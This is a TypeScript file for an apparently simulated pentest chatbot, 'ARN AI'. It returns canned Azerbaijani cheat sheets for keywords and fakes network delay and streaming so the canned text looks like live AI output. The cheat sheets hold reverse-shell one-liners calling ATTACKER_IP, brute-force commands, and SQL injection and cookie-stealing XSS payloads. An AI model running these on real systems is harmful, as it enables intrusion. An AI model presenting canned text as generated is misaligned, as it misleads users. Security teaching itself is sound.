// Free AI API service using multiple providers

// System prompt for AI context (used in future API integrations)
// Sən ARN AI - professional pentest və cybersecurity AI assistantısan.

interface AIResponse {
  content: string;
  tokensUsed: number;
}

// Simulate AI responses with pentest knowledge base
const pentestResponses: { [key: string]: string } = {
  'hydra': `**Hydra - Password Cracker**

Hydra şəbəkə xidmətləri üçün güclü brute-force tool-dur.

**Əsas Əmrlər:**
\`\`\`bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://target

# HTTP POST form
hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP attack
hydra -L users.txt -P pass.txt ftp://target

# RDP attack
hydra -l administrator -P pass.txt rdp://target
\`\`\`

**Dəstəklənən Protokollar:**
- SSH, FTP, Telnet
- HTTP, HTTPS
- SMB, RDP, VNC
- MySQL, PostgreSQL, MSSQL
- SMTP, POP3, IMAP`,

  'hashcat': `**Hashcat - Password Recovery**

Hashcat dünyanın ən sürətli password recovery tool-udur.

**Hash Növləri:**
\`\`\`bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA256  
hashcat -m 1400 hash.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 hash.txt wordlist.txt

# bcrypt
hashcat -m 3200 hash.txt wordlist.txt
\`\`\`

**Attack Modes:**
- \`-a 0\` - Dictionary attack
- \`-a 1\` - Combination attack  
- \`-a 3\` - Brute-force
- \`-a 6\` - Hybrid wordlist + mask

**Performans:**
- GPU acceleration dəstəkləyir
- Multi-GPU dəstəyi
- Distributed cracking`,

  'wireshark': `**Wireshark - Network Analysis**

Wireshark şəbəkə protokol analizatoru və packet snifferdir.

**Capture Filters:**
\`\`\`
host 192.168.1.1
port 80
tcp port 443
not arp
\`\`\`

**Display Filters:**
\`\`\`
http.request.method == "POST"
tcp.port == 80
ip.src == 192.168.1.1
dns.qry.name contains "example"
\`\`\`

**Analiz Metodları:**
1. **Follow TCP Stream** - Söhbəti izlə
2. **Statistics > Conversations** - Bağlantılar
3. **Statistics > Protocol Hierarchy** - Protokollar
4. **File > Export Objects** - Faylları çıxar`,

  'gobuster': `**Gobuster - Directory Bruteforcer**

Gobuster web directory və DNS enumeration üçün istifadə olunur.

**Directory Bruteforce:**
\`\`\`bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

# With status codes
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302"
\`\`\`

**DNS Enumeration:**
\`\`\`bash
gobuster dns -d target.com -w subdomains.txt
\`\`\`

**Vhost Discovery:**
\`\`\`bash
gobuster vhost -u http://target.com -w vhosts.txt
\`\`\``,

  'john': `**John the Ripper - Password Cracker**

John açıq mənbəli password cracker-dir.

**Əsas İstifadə:**
\`\`\`bash
# Basic crack
john --wordlist=rockyou.txt hashes.txt

# Show cracked
john --show hashes.txt

# Specific format
john --format=raw-md5 hashes.txt
\`\`\`

**Hash Formatları:**
- \`--format=raw-md5\`
- \`--format=raw-sha256\`
- \`--format=bcrypt\`
- \`--format=nt\` (NTLM)

**Rules:**
\`\`\`bash
john --wordlist=words.txt --rules hashes.txt
\`\`\``,

  'reverse shell': `**Reverse Shell Cheat Sheet**

⚠️ Yalnız icazəli sistemlərdə istifadə edin!

**Bash:**
\`\`\`bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
\`\`\`

**Python:**
\`\`\`python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
\`\`\`

**PHP:**
\`\`\`php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
\`\`\`

**Listener:**
\`\`\`bash
nc -lvnp PORT
\`\`\``,

  'nmap': `**Nmap - Network Mapper**

Nmap şəbəkə kəşfiyyatı və təhlükəsizlik auditi üçün istifadə olunur.

**Əsas Əmrlər:**
\`\`\`bash
# Basic scan
nmap -sV target.com

# Aggressive scan
nmap -A -T4 target.com

# Full port scan
nmap -p- target.com

# Vulnerability scan
nmap --script vuln target.com
\`\`\`

**Populyar Script-lər:**
- \`--script=http-vuln*\` - HTTP vulnerabilities
- \`--script=ssl-heartbleed\` - Heartbleed check
- \`--script=smb-vuln*\` - SMB vulnerabilities`,

  'sql injection': `**SQL Injection - Ən Təhlükəli Vulnerability**

SQL Injection OWASP Top 10-un #1 vulnerability-sidir.

**Test Payload-ları:**
\`\`\`sql
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL,NULL,NULL --
'; DROP TABLE users; --
\`\`\`

**Müdafiə Metodları:**
1. **Prepared Statements** istifadə et
2. **Input Validation** - whitelist approach
3. **ORM** istifadə et
4. **Minimum Privileges** - DB user üçün

**SQLMap istifadəsi:**
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" --tables -D database
\`\`\``,

  'xss': `**XSS - Cross-Site Scripting**

XSS web application-larda ən çox rast gəlinən vulnerability-dir.

**XSS Növləri:**
1. **Reflected XSS** - URL-dən
2. **Stored XSS** - Database-dən
3. **DOM-based XSS** - Client-side

**Test Payload-ları:**
\`\`\`javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert(document.cookie)</script>
\`\`\`

**Müdafiə:**
- Output encoding
- Content Security Policy (CSP)
- HttpOnly cookies
- Input validation`,

  'burp': `**Burp Suite - Web Security Testing**

Burp Suite web application pentest üçün #1 tool-dur.

**Əsas Modullar:**
1. **Proxy** - Traffic intercept
2. **Scanner** - Auto vulnerability scan
3. **Intruder** - Brute force attacks
4. **Repeater** - Manual request testing
5. **Decoder** - Encoding/decoding

**Konfiqurasiya:**
1. Browser proxy: 127.0.0.1:8080
2. SSL Certificate install
3. Scope təyin et

**Intruder Attack Types:**
- Sniper - Tək payload
- Battering ram - Eyni payload
- Pitchfork - Paralel payloads
- Cluster bomb - Kombinasiyalar`,
};

function findRelevantResponse(query: string): string | null {
  const lowerQuery = query.toLowerCase();
  
  for (const [key, response] of Object.entries(pentestResponses)) {
    if (lowerQuery.includes(key)) {
      return response;
    }
  }
  return null;
}

async function generateSmartResponse(message: string): Promise<string> {
  // Check for known topics
  const knownResponse = findRelevantResponse(message);
  if (knownResponse) {
    return knownResponse;
  }

  // Generate contextual response
  const lowerMessage = message.toLowerCase();
  
  if (lowerMessage.includes('salam') || lowerMessage.includes('hello') || lowerMessage.includes('hi')) {
    return `Salam! 👋 Mən ARN AI - professional pentest assistantıyam.

Sizə aşağıdakı mövzularda kömək edə bilərəm:

🔒 **Penetration Testing**
- Network scanning (Nmap, Masscan)
- Web application testing
- Vulnerability assessment

🛡️ **Security Analysis**
- Kod təhlükəsizliyi
- OWASP Top 10
- Security best practices

💻 **Tools & Techniques**
- Burp Suite, OWASP ZAP
- Metasploit Framework
- Kali Linux tools

Hansı mövzuda kömək istərdiniz?`;
  }

  if (lowerMessage.includes('metasploit') || lowerMessage.includes('msf')) {
    return `**Metasploit Framework**

Metasploit ən güclü exploitation framework-üdür.

**Əsas Əmrlər:**
\`\`\`bash
msfconsole              # Start Metasploit
search type:exploit     # Search exploits
use exploit/...         # Select exploit
show options           # View options
set RHOSTS target      # Set target
run                    # Execute
\`\`\`

**Populyar Modullar:**
- \`exploit/windows/smb/ms17_010_eternalblue\`
- \`exploit/multi/http/apache_struts\`
- \`auxiliary/scanner/portscan/tcp\`

**Meterpreter Əmrləri:**
\`\`\`
sysinfo, getuid, getsystem
hashdump, download, upload
shell, migrate, screenshot
\`\`\``;
  }

  if (lowerMessage.includes('owasp') || lowerMessage.includes('top 10')) {
    return `**OWASP Top 10 - 2023**

Web Application Security Risks:

1. **A01:2021 - Broken Access Control**
   - IDOR, privilege escalation

2. **A02:2021 - Cryptographic Failures**
   - Weak encryption, exposed data

3. **A03:2021 - Injection**
   - SQL, NoSQL, LDAP, OS command

4. **A04:2021 - Insecure Design**
   - Missing security controls

5. **A05:2021 - Security Misconfiguration**
   - Default credentials, verbose errors

6. **A06:2021 - Vulnerable Components**
   - Outdated libraries

7. **A07:2021 - Authentication Failures**
   - Weak passwords, session issues

8. **A08:2021 - Software Integrity Failures**
   - CI/CD vulnerabilities

9. **A09:2021 - Logging Failures**
   - No monitoring

10. **A10:2021 - SSRF**
    - Server-Side Request Forgery`;
  }

  if (lowerMessage.includes('kali') || lowerMessage.includes('linux')) {
    return `**Kali Linux - Pentest Distribution**

Kali Linux penetration testing üçün ən populyar Linux distribution-dır.

**Əsas Tool Kategoriyaları:**

🔍 **Information Gathering:**
- Nmap, Maltego, theHarvester
- Recon-ng, Shodan

🎯 **Vulnerability Analysis:**
- Nikto, OpenVAS, Nessus

🔓 **Exploitation Tools:**
- Metasploit, SQLmap, BeEF

🔑 **Password Attacks:**
- John the Ripper, Hashcat
- Hydra, Medusa

📡 **Wireless Attacks:**
- Aircrack-ng, Wifite, Kismet

🌐 **Web Applications:**
- Burp Suite, OWASP ZAP
- Wfuzz, Dirb, Gobuster`;
  }

  // Default intelligent response
  return `**ARN AI Cavabı**

Sualınızı analiz etdim. Bu mövzu haqqında məlumat:

${message.length > 50 ? message.substring(0, 50) + '...' : message}

**Əlaqəli Resurslar:**
- OWASP metodologiyası
- PTES (Penetration Testing Execution Standard)
- NIST Cybersecurity Framework

**Tövsiyələr:**
1. Həmişə yazılı icazə alın
2. Scope-u dəqiq müəyyən edin
3. Bütün tapıntıları sənədləşdirin
4. Responsible disclosure prinsiplərinə əməl edin

Daha ətraflı məlumat üçün konkret sual verin! 🔐`;
}

export async function sendMessage(message: string, _conversationHistory: { role: string; content: string }[]): Promise<AIResponse> {
  // Simulate network delay for realistic feel
  await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
  
  const response = await generateSmartResponse(message);
  const tokensUsed = Math.ceil(response.length / 4); // Approximate token count
  
  return {
    content: response,
    tokensUsed
  };
}

export async function streamMessage(
  message: string, 
  onChunk: (text: string) => void,
  _conversationHistory: { role: string; content: string }[] = []
): Promise<number> {
  const fullResponse = await generateSmartResponse(message);
  
  // Stream the response character by character
  let currentText = '';
  const chars = fullResponse.split('');
  
  for (let i = 0; i < chars.length; i++) {
    currentText += chars[i];
    onChunk(currentText);
    
    // Variable delay for natural feel
    const delay = chars[i] === '\n' ? 50 : (chars[i] === ' ' ? 20 : 10);
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  return Math.ceil(fullResponse.length / 4);
}
